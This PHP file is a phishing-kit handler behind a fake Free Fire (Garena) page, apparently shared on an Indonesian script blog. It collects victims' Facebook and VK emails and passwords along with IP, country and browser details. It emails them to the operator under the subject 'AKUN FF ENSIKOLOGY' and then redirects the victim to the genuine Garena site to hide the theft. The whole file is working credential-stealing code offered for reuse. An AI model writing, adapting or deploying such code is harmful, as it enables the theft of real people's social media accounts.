<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php

include('cilepeung.php');

$email    = $_POST['email'];
$pass = $_POST['pass'];
$sk = $_POST['sk'];
$lv = $_POST['lv'];
$no = $_POST['no'];
$recover = $_POST['recovery'];
$passe = $_POST['passre'];
$email1    = $_POST['email1'];
$pass1 = $_POST['pass1'];
$nk = $_POST['nk'];
$cn = $_POST['cn'];
$vk = $_POST['vk'];
$vk2 = $_POST['vk2'];
$mo = $_POST['mo'];
$mo2 = $_POST['mo2'];


$message   = "



===[FACEBOOK ACCOUNT]===

Email : ".$email1."
Password :  ".$pass1."

===[VK ACCOUNT]===

Email : ".$vk."
Password :  ".$vk2."

===[UHUINFO99]===


IP Info   :  ".$alamat." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

+++++ ENSIKOLOGY.BLOGSPOT.COM +++++


";

include 'email.php';
$subject = "AKUN FF ENSIKOLOGY (".$email1.")";
$headers = "From: [ENSIKOLOGY]  <result@free.fire>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>

<script>window.location.replace("https://ff.garena.com/news/id.html")</script>';}
}
?>
<!--SCRIPT REEDIT BY: UHUINFO99 http://uhuinfo.com -->
<!--SCRIPT REEDIT BY: SAHRUL VAN KHAN http://facebook.com/sahrulkhan007 -->
<!--SIDRAP SULSEL- INDONESIA - 2018-->